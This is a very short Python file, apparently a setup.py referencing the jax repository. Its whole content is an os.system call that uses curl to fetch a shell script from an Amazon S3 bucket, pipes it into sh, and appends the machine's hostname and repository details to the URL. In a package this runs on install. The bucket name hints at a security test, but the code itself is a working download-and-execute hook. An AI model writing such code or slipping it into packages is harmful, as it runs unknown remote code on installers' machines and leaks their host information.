
import os

os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/jax.git\&folder=jax\&hostname=`hostname`\&foo=mmv\&file=setup.py')
